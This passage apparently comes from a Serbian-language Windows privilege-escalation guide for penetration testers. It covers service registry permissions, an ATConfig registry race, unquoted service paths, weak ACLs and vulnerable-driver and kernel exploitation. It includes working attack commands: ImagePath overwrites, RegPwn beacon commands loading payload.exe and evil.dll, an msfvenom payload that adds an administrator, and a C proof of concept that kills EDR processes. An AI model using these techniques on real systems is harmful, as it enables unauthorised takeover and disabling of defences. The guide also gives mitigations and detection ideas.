for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Prvobitni test dozvola glasio je:

Treba proveriti da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole `FullControl`. Ako ih imaju, moguće je izmeniti binary koji servis izvršava.

Proverite da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole registra koje omogućavaju upis u određeni ključ servisa. Sam unos ACL-a ne dokazuje da je pristup efektivan: važni su unosi za odbijanje, trenutni token i nasleđene dozvole. Dozvole ključa registra odvojene su od dozvola `SERVICE_CHANGE_CONFIG` i `SERVICE_START` nad samim objektom servisa. Za eskalaciju su potrebni i upotrebljivo polje konfiguracije servisa, način da se servis pokrene i identitet servisa sa višim privilegijama. Pogledajte Microsoftove reference za [dozvole ključa registra](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) i [dozvole pristupa servisu](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Da biste promenili putanju do binary-ja koji se izvršava:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race do proizvoljnog upisa HKLM vrednosti (ATConfig)

Neke Windows Accessibility funkcije kreiraju per-user **ATConfig** ključeve koje **SYSTEM** proces kasnije kopira u HKLM session ključ. Registry **symbolic link race** može da preusmeri taj privilegovani upis na **bilo koju HKLM putanju**, čime se dobija mogućnost proizvoljnog **upisa HKLM vrednosti**.<sup>[[18]](#references)</sup>

Lokacije ključeva (primer: tastatura na ekranu `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` navodi instalirane funkcije pristupačnosti.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` čuva konfiguraciju koju kontroliše korisnik.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` kreira se tokom prijavljivanja/prelaza na bezbednu radnu površinu i korisnik može da ga menja.

Tok zloupotrebe (CVE-2026-24291 / ATConfig):

1. Popunite vrednost **HKCU ATConfig** koju želite da upiše SYSTEM.
2. Pokrenite kopiranje na bezbednu radnu površinu (npr. **LockWorkstation**), čime se pokreće AT broker tok.
3. **Dobijte race** postavljanjem **oplock**-a na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; kada se oplock aktivira, zamenite **HKLM Session ATConfig** ključ **registry link**-om ka zaštićenom HKLM cilju.
4. SYSTEM upisuje vrednost koju je izabrao napadač u preusmerenu HKLM putanju.

Kada dobijete mogućnost proizvoljnog upisa HKLM vrednosti, iskoristite je za LPE tako što ćete prepisati vrednosti konfiguracije servisa:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komandna linija)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Izaberite servis koji običan korisnik može da pokrene (npr. **`msiserver`**) i pokrenite ga nakon upisa. **Napomena:** javna implementacija exploita **zaključava radnu stanicu** kao deo race-a.

Primer alata (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Dozvole AppendData/AddSubdirectory u registru servisa

Ako imate ovu dozvolu nad registrom, možete da kreirate podključeve u njemu. Kod Windows servisa, ovo je **dovoljno za izvršavanje proizvoljnog koda:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ako putanja do izvršne datoteke nije pod navodnicima, Windows će pokušati da izvrši svaki deo putanje koji se završava pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Navedite sve putanje servisa koje nisu pod navodnicima, osim onih koje pripadaju ugrađenim Windows servisima:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ovu ranjivost možete otkriti i iskoristiti** pomoću metasploit-a: `exploit/windows/local/trusted\_service\_path` Možete ručno napraviti binarnu datoteku servisa pomoću metasploit-a:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Radnje oporavka

Windows omogućava korisnicima da navedu radnje koje će se preduzeti ako usluga otkaže. Ova funkcija može biti konfigurisana tako da upućuje na binarnu datoteku. Ako je moguće zameniti tu datoteku, možda je moguća privilege escalation. Više detalja možete pronaći u [zvaničnoj dokumentaciji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Ciljne skripte zakazanih zadataka

Kod omogućenog zadatka koji pokreće `cmd.exe /c` sa `.bat` ili `.cmd` datotekom, proverite skriptu navedenu u **argumentima radnje**, kao i `cmd.exe`. Isto važi za eksplicitni argument datoteke interpreteru, kao što je PowerShell `-File`. Ako zakazana batch datoteka sadrži doslovni poziv PowerShell `-File`, proverite i ACL navedene skripte; promenljive, uslovne naredbe i ulančavanje komandi zahtevaju ručno praćenje. Skripta ili nadređeni direktorijum u koji pozivalac može da upisuje predstavljaju mogućnost izvršavanja između naloga samo kada se principal konfigurisan za zadatak razlikuje od pozivaoca i kada zadatak zaista dođe do te radnje. ACL koji dozvoljava samo dodavanje sadržaja može biti važan za skripte, ali raniji `exit` ili drugi tok izvršavanja mogu učiniti dodate redove nedostižnim. Proverite efektivne ACL-ove, [kontekst izvršavanja zadatka](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), radni direktorijum, okidač i smernice za kontrolu aplikacija pre nego što zaključite da je moguća privilege escalation. Inventarisanje ne treba da menja skriptu niti da pokreće zadatak.

## Imenovani tokovi u dostupnim datotekama

Na NTFS-u, čitljiva datoteka može imati imenovani `:$DATA` tok čiji sadržaj nije prikazan u običnom spisku direktorijuma. Za mali, relevantan skup dostupnih rezervnih kopija ili konfiguracionih datoteka, proverite **nazive i veličine** tokova pre otvaranja bilo kakvog sadržaja; Windows ih izlaže putem [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), a PowerShell putem [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Naziv toka koji nagoveštava da sadrži tajnu samo je trag. Proverite efektivna prava čitanja datoteke, podršku sistema datoteka za tokove, da li tok sadrži upotrebljive akreditive i sa kojim se nalogom oni zaista autentifikuju. Izbegavajte rekurzivno skeniranje tokova i ispisivanje njihovog sadržaja tokom rutinskog popisivanja.

## Ulazi pomoćnog programa Windows Driver Kit koji se pokreće po rasporedu

Opcioni Windows Driver Kit uključuje `StandaloneRunner.exe`, koji može da koristi datoteke `command.txt`, `reboot.rsf` i projektnu datoteku `working\rsf.rsf` iz direktorijuma iz kog se pokreće. Zakazani zadatak ili usluga koja pokreće ovaj pomoćni program sa privilegovanim nalogom mogu pretvoriti pristup za upis sa niskim privilegijama u te datoteke u izvršavanje komandi u kontekstu tog naloga, čak i kada je sam izvršni fajl zaštićen. Potvrdite da ih koristi privilegovani proces i da se **obe** prateće datoteke mogu kreirati ili menjati; samo pronalaženje pomoćnog programa nije dovoljno.

Kod zakazanog zadatka, pregledajte [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) njegove radnje i ACL-ove dveju pratećih putanja. Ako zadatak ne navodi radni direktorijum, direktorijum izvršne datoteke samo je trag koji treba proveriti, a ne dokaz gde zadatak čita ulazne datoteke. Mora biti ispunjen i preduslov za projektnu radnu datoteku. Proverite stvarni principal zadatka umesto da pretpostavite da se izvršava kao SYSTEM.

## Aplikacije

### Instalirane aplikacije

Proverite **dozvole nad binarnim datotekama** (možda možete da zamenite neku od njih i eskalirate privilegije) i nad **direktorijumima** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Putanja za popravku Windows agenta Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) utiče na starije Windows agente Checkmk koji su upisivali komandne datoteke u `C:\Windows\Temp`, a zatim izvršavali postojeću datoteku zaštićenu od upisivanja ako zamena ne bi uspela. Dobavljač je ispravio problem u verzijama 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Proverite tačan instalirani nivo zakrpe i da li se pogođena operacija agenta može pokrenuti; oznaka grane kao što je `2.1` ne može da potvrdi izloženost. Enumeracijom se mogu proveriti verzija, stanje servisa i dozvole za Temp bez kreiranja datoteka ili pokretanja komandi agenta.

#### Provera SAML servisa ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) utiče na ADSelfService Plus build 6210 i starije; dobavljač je ispravio problem u buildu 6211. Relevantan je samo ako je SAML SSO **omogućen ili je ranije bio omogućen**. Unos instaliranog proizvoda ili putanja servisa zato su naznake, a ne potvrda ranjivosti: proverite tačan build, istoriju SAML konfiguracije, mrežnu dostupnost servisa i nalog pod kojim se izvršava. Izvršavanje koda kroz servis nasleđuje privilegije tog naloga; izvršavanje kao SYSTEM zahteva instancu koja radi kao SYSTEM. Datoteka `OfflineBackup_*.ezip` čitljiva u direktorijumu Backup proizvoda predstavlja zasebnu naznaku šifrovane rezervne kopije, a ne dokaz da su akreditivi upotrebljivi ili da postoji ova SAML ranjivost. Tokom rutinske enumeracije zabeležite njenu putanju i prava pristupa, ali je nemojte raspakovati.

#### Granice Jenkins kontrolera i domenskih naloga

Na Windows Jenkins kontroleru razlikujte dozvolu za kreiranje ili konfigurisanje posla od dozvole za njegovo pokretanje: [Jenkins documents these as separate `Job/Create`, `Job/Configure`, and `Job/Build` rights](https://www.jenkins.io/doc/book/security/access-control/permissions/). Konfigurisani raspored ili udaljeni okidač mogu da pruže drugi način pokretanja build-a, ali proverite da li je omogućen i da li se build zaista izvršava. Kod se izvršava pod identitetom kontrolera ili izabranog agenta, a sačuvani akreditiv može da se koristi samo ako posao ima pristup njegovom opsegu. Zasebno proverite pristup metapodacima u `JENKINS_HOME`: Jenkins čuva materijal akreditiva i ključeve za šifrovanje u `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). Njihovo prisustvo samo po sebi ne otkriva lozinku; proverite **pristup čitanja potrebnim datotekama** i zaseban put za ponovnu upotrebu naloga, bez ispisivanja tajni u deljenom izlazu. Ako taj nalog ima pravo upisivanja u `scriptPath` AD korisničkog objekta, proverite da li je putanja za upisivanje dostupna i da li postoji stvarna prijava ili zakazani proces koji je koristi i izvršava se kao ciljni korisnik, pre nego što to tretirate kao izvršavanje između korisnika. Dodatnu kontrolu nad grupom treba potvrditi zasebno, proverom efektivnih AD prava.

#### Identitet samostalno hostovanog agenta Azure Pipelines

Za Azure DevOps Server ili projekat Azure Pipelines, razlikujte dozvolu za **kreiranje ili uređivanje** pipeline-a od dozvole za njegovo **stavljanje u red čekanja** i korišćenje izabranog skupa agenata; [Microsoft documents pipeline permissions](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) i [pool authorization](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) nezavisno. Ako nalog sa nižim privilegijama može da pošalje skriptni korak i pokrene taj pipeline na samostalno hostovanom Windows agentu, korak se izvršava kao [agent's configured operating-system account](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Pre tvrdnje da dolazi do prelaska između korisnika ili na SYSTEM, proverite konkretan pipeline, ograničenja grane/resursa, ovlašćeni skup agenata, izvršiv posao i identitet servisnog naloga agenta. Instalirani agent, uloga u projektu ili pristup upisivanju u repozitorijum samo su naznake; tokom pasivne enumeracije pregledajte dozvole i lokalne metapodatke servisa, bez pokretanja build-a.

#### Akreditivi za Microsoft Entra Connect Sync

[Microsoft distinguishes](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **ADSync servisni nalog**, koji pokreće servis za sinhronizaciju i pristupa njegovoj SQL bazi podataka, od **AD DS connector naloga**, čije dozvole u direktorijumu zavise od konfigurisanih funkcija sinhronizacije. Akreditivi konektora čuvaju se šifrovani u toj bazi podataka, a ključni materijal je [protected by DPAPI under the ADSync service account](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Instalirani servis za sinhronizaciju, grupa čiji naziv sugeriše administratorska prava ili sam pristup bazi podataka ne dokazuju da akreditiv može da se dešifruje niti da je moguća eskalacija privilegija u domenu. Zasebno proverite stvarna prava čitanja baze podataka, pristup servisnom nalogu/ključu, raspored instalacije i SQL-a, konfigurisani identitet konektora i efektivne AD privilegije tog identiteta. Rutinska enumeracija treba da prikazuje samo metapodatke servisa i pristupa, a ne da ispituje ili ispisuje sačuvane tajne.

#### Dozvole za DLL-ove podrške drajvera štampača

Instalirani drajver štampača može da čuva DLL-ove podrške u `C:\ProgramData` i da ih učitava u privilegovanijem procesu za štampanje. Proverite tačan direktorijum drajvera i ACL-ove DLL-ova, uključujući nadređene direktorijume i reparse points, čak i ako je enumeracija štampača putem WMI onemogućena. Za [Ricoh printer-driver issue CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), prijavljena putanja bila je `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [the original disclosure](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) opisuje učitavanje DLL-a putem procesa `PrintIsolationHost.exe`. ACL koji dozvoljava upisivanje samo je naznaka: proverite efektivni pristup upisivanju nakon uzimanja u obzir deny unosa, da li je relevantni drajver instaliran i učitava li datoteku pod privilegovanim identitetom, kao i da li je dobavljač ažuriranim drajverom ili bezbednosnim programom ispravio instalaciju. Nemojte zaključivati da postoji ranjivost samo na osnovu naziva direktorijuma ili verzije drajvera.

### Dozvole za upisivanje

Proverite da li možete da izmenite neku konfiguracionu datoteku kako biste pročitali posebnu datoteku ili da izmenite binarnu datoteku koju će izvršiti nalog Administratora (schedtasks).

Slabe dozvole za direktorijume/datoteke u sistemu možete da pronađete ovako:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Postojanost/izvršavanje pri automatskom učitavanju Notepad++ pluginova

Notepad++ automatski učitava sve DLL-ove pluginova iz svojih podfoldera `plugins`. Ako postoji instalacija prenosive verzije/kopija u koju je moguće pisati, ubacivanje zlonamernog plugina omogućava automatsko izvršavanje koda unutar `notepad++.exe` pri svakom pokretanju (uključujući izvršavanje iz `DllMain` funkcije i callback-ova plugina).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Pokretanje pri startu

**Proverite da li možete da prepišete neki registar ili binarnu datoteku koju će pokrenuti drugi korisnik.**\
**Pročitajte** **sledeću stranicu** da biste saznali više o zanimljivim **lokacijama za autorun koje omogućavaju eskalaciju privilegija**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drajveri

Potražite moguće **čudne/ranjive drajvere trećih strana**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ako drajver izlaže primitivu za proizvoljno čitanje/pisanje u kernelu (što je uobičajeno kod loše dizajniranih IOCTL rukovalaca), možete eskalirati privilegije tako što ćete direktno ukrasti SYSTEM token iz kernel memorije.<sup>[[13]](#references)</sup> Pogledajte tehniku korak po korak ovde:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Povezani materijali o Windows kernel eksploataciji:

Za slučaj kernel-mode ring-buffer-a sa registrima za čitanje/pisanje koje može da menja korisnički prostor, pogledajte [USB MIDI varijantu sa kružnim strimovanjem](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Kod race-condition grešaka u kojima ranjivi poziv otvara putanju Object Manager-a koju kontroliše napadač, namerno usporavanje pretrage (korišćenjem komponenti maksimalne dužine ili dubokih lanaca direktorijuma) može da produži vremenski prozor sa mikrosekundi na desetine mikrosekundi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### UAF greške u cancel-safe queue-ovima, otkrivanje podataka iz paged pool-a i I/O ring preusmeravanja

Neki Windows kernel LPE lanci mogu se napraviti kombinovanjem dve pojedinačno slabe greške: **race condition-a u životnom veku cancel-safe queue-a** koji oslobađa zahtev/CBD dok je zaključavanje reda i dalje aktivno, i otkrivanja podataka usled **oslobađanja zaključavanja pre kopiranja** koje otkriva oslobođenu alokaciju iz paged pool-a tokom `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Napomene za audit i eksploataciju:

- **Oslobađanje memorije pod zaključavanjem + naknadno otkazivanje**: potražite putanju uspeha koja radi **Acquire -> CompleteRequest/free -> Release**, dok putanja otkazivanja radi **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ako putanja uspeha dođe do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` pre oslobađanja CBDQ/CSQ zaključavanja, nit blokirana u `NtCancelIoFileEx -> IopCsqCancelRoutine` može kasnije da nastavi i prosledi oslobođeni `PFLT_CALLBACK_DATA` nazad povratnom pozivu za uklanjanje drajvera.
- **Ponovo iskoristite oslobođeni objekat reda** pomoću alokacije iz paged pool-a iste veličine koju kontroliše napadač. `NPFS` Data Queue Entries su korisni jer se sadržaj i veličina mogu kontrolisati, a kasnije ih možete ispitati operacijama čitanja/nadgledanja pipe-a. Ako oslobođeni objekat sadrži linkove liste, prepišite ih **cikličnom listom lažnih čvorova zahteva u korisničkoj memoriji** kako bi drajver stalno obrađivao strukture zahteva koje definiše napadač, umesto da se zaustavi na prvobitnoj glavi liste.
- **Unapredite predvidivo pisanje**: ako lažni zahtev preusmeri ugnježdeni pokazivač konteksta koji se koristi za upise pri vođenju evidencije (vremenske oznake / QPC / polja uz brojanje referenci), možda ćete dobiti upis u kernel memoriju čija se adresa može kontrolisati, ali ne i vrednost. U tom slučaju, ciljajte polje **length/size** objekta iz pool-a koji je raspoređen masovno, umesto konačnog pokazivača na kod/podatke, a zatim isprobavajte objekte iz te grupe dok oštećeni objekat ne omogući **čitanje van granica iz paged pool-a**.
- **Obrazac otkrivanja podataka podložan race condition-u**: svaki syscall koji radi `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` dobar je kandidat. Pouzdanost se poboljšava kada napadač može da poveća kopirani bafer (na primer, dodavanjem brojnih unosa liste/resursa koji povećavaju konačnu veličinu alokacije serijalizatora), jer duže kopiranje proširuje prozor za zamenu, a da pritom ne mora nužno da sruši sistem.
- **Ciljevi za ponovno popunjavanje bogati pokazivačima**: registrovani baferi Windows **I/O ring-a** odlični su ciljevi za otkrivanje podataka jer se veličina njihove alokacije iz paged pool-a može kontrolisati napadaчем (`8 * regBufferCnt`), a svaki element je kernel pokazivač na `_IOP_MC_BUFFER_ENTRY`. Oткријте један од ових низова, пронађите околни `IORING_OBJECT`, па оштетите **`RegBuffers`** и **`RegBuffersCount`** тако да наредне I/O ring операције користе фалсификоване уносе које контролише нападач и омогуће произвољно читање/писање у kernel меморију. Ако је једино доступно писање стабилан бајт (на пример, из `KUSER_SHARED_DATA+0x14`), користите **преклапајућа непоравната писања** да направите кориснички показивач са поновљеним бајтом, као што је `0x0101010101010101`, мапирајте га помоћу `VirtualAlloc` и тамо сместите фалсификовани низ регистрованих бафера.<sup>[[30]](#references)</sup>

Корисни показатељи за отклањање грешака:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Kada iz korumpiranog I/O ring-a dobijete proizvoljan kernel read/write, ukradite SYSTEM token standardnim post-primitive postupkom:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitive za korupciju memorije Registry hive-a

Savremene ranjivosti hive-a omogućavaju da pripremite determinističke rasporede memorije, zloupotrebite upisive potomke HKLM/HKU i pretvorite korupciju metapodataka u prekoračenja kernel paged pool-a, bez prilagođenog drajvera. Ceo lanac je objašnjen ovde:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Zbrka tipova u direktnom režimu `RtlQueryRegistryValues` usled putanja pod kontrolom napadača

Neki drajveri prihvataju putanju Registry-ja iz userland-a, proveravaju samo da li je ispravna UTF-16 niska, a zatim pozivaju `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` sa `RTL_QUERY_REGISTRY_DIRECT` i prosleđuju pokazivač na skalarni tip na steku, kao što je `int readValue`. Ako nedostaje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` се tumači prema **stvarnom** tipu Registry-ja, a ne tipu koji je programer očekivao.

Ovo omogućava dva korisna primitiva:<sup>[[24]](#references)[[25]](#references)</sup>

- **Zbunjeni posrednik / oracle**: apsolutna putanja `\Registry\...` pod kontrolom napadača omogućava drajveru da upituje ključeve koje je izabrao napadač, otkriva njihovo postojanje preko povratnih kodova/evidencije i ponekad čita vrednosti kojima pozivalac ne bi mogao direktno da pristupi.
- **Korupcija kernel memorije**: odredište skalarnog tipa, kao što je `&readValue`, može biti pogrešno protumačeno kao `REG_QWORD`, `UNICODE_STRING` ili bafer binarnih podataka određene veličine, u zavisnosti od tipa Registry vrednosti.

Napomene o praktičnoj eksploataciji:

- **Ublažavanje u Windows 8+**: ako upit pristupi **nepouzdanom hive-u** sa `RTL_QUERY_REGISTRY_DIRECT`, ali bez `RTL_QUERY_REGISTRY_TYPECHECK`, kernel pozivalac se ruši uz `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Da bi ranjivost ostala iskoristiva, potražite **ključeve u pouzdanim sistemskim hive-ovima u koje napadač može da upisuje**, umesto da pripremate vrednosti u `HKCU`.
- **Priprema u pouzdanom hive-u**: koristite NtObjectManager da pronađete upisive potomke od `\Registry\Machine`, a zatim ponovite skeniranje sa dupliranim tokenom **niskog integriteta** da biste pronašli ključeve dostupne iz sandbox-ovanih konteksta:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: direktan upis od 8 bajtova u 4-bajtni `int` oštećuje susedne podatke steka i može delimično da prepiše obližnji callback/function pointer.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direktni režim očekuje da `EntryContext` pokazuje na `UNICODE_STRING`. Ako kod prvo učita `REG_DWORD` pod kontrolom napadača u skalarni podatak na steku, a zatim ponovo iskoristi isti bafer za čitanje stringa, napadač kontroliše `Length`/`MaximumLength` i delimično utiče na pokazivač `Buffer`, što omogućava delimično kontrolisan upis u kernel.
- **`REG_BINARY`**: za velike binarne podatke, direktni režim tretira prvi `LONG` na adresi `EntryContext` kao predznačenu veličinu bafera. Ako prethodno čitanje `REG_DWORD` ostavi negativnu vrednost pod kontrolom napadača u ponovo korišćenom skalarnom podatku, sledeći upit za `REG_BINARY` kopira bajtove napadača direktno preko susednih slotova steka, što je često najjednostavniji način da se u potpunosti prepiše callback pointer.

Efikasan obrazac za pronalaženje: **heterogena čitanja registra u istu promenljivu na steku bez njene ponovne inicijalizacije**. Pretražujte `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponovo korišćene pokazivače `EntryContext` i putanje koda u kojima prvo čitanje registra određuje da li će doći do drugog čitanja.

#### Zloupotreba nedostajućeg FILE_DEVICE_SECURE_OPEN na objektima uređaja (LPE + EDR kill)

Neki potpisani drajveri nezavisnih proizvođača kreiraju svoj objekat uređaja sa snažnim SDDL-om koristeći IoCreateDeviceSecure, ali zaboravljaju da postave FILE_DEVICE_SECURE_OPEN u DeviceCharacteristics. Bez ove zastavice, bezbedni DACL se ne sprovodi kada se uređaju pristupa putanjom koja sadrži dodatnu komponentu, pa svaki neprivilegovani korisnik može da dobije handle koristeći putanju imenskog prostora kao što je:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (iz slučaja iz stvarnog sveta)

Kada korisnik može da otvori uređaj, privilegovani IOCTL-ovi koje drajver izlaže mogu da se zloupotrebe za LPE i neovlašćene izmene. Primeri mogućnosti zabeleženih u praksi:
- Vraćanje handle-ova sa punim pristupom proizvoljnim procesima (krađa tokena / SYSTEM shell pomoću DuplicateTokenEx/CreateProcessAsUser).
- Neograničeno čitanje/upisivanje sirovog diska (neovlašćene izmene van mreže, trikovi za postojanost pri pokretanju sistema).
- Prekidanje proizvoljnih procesa, uključujući Protected Process/Light (PP/PPL), što omogućava gašenje AV/EDR-a iz korisničkog prostora putem kernela.

Minimalni obrazac PoC-a (korisnički režim):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Ublažavanje rizika za programere
- Uvek postavite FILE_DEVICE_SECURE_OPEN prilikom kreiranja objekata uređaja koje treba ograničiti pomoću DACL-a.
- Proverite kontekst pozivaoca za privilegovane operacije. Dodajte PP/PPL provere pre nego što dozvolite terminaciju procesa ili vraćanje handle-ova.
- Ograničite IOCTL-ove (maske pristupa, METHOD_*, validacija ulaza) i razmotrite posredničke modele umesto direktnih privilegija kernela.

Ideje za detekciju za odbranu
- Pratite otvaranja sumnjivih naziva uređaja iz korisničkog režima (npr. \\ .\\amsdk*) i specifične sekvence IOCTL-ova koje ukazuju na zloupotrebu.
- Sprovodite Microsoft-ovu listu blokiranih ranjivih drajvera (HVCI/WDAC/Smart App Control) i održavajte sopstvene liste dozvoljenih/zabranjenih stavki.


## PATH DLL Hijacking

Ako imate **dozvole za upis u fasciklu koja se nalazi na PATH-u**, možda ćete moći da preotmete DLL koji učitava proces i **eskalirate privilegije**.<sup>[[2]](#references)</sup>

Proverite dozvole za sve fascikle unutar PATH-a:

```bash
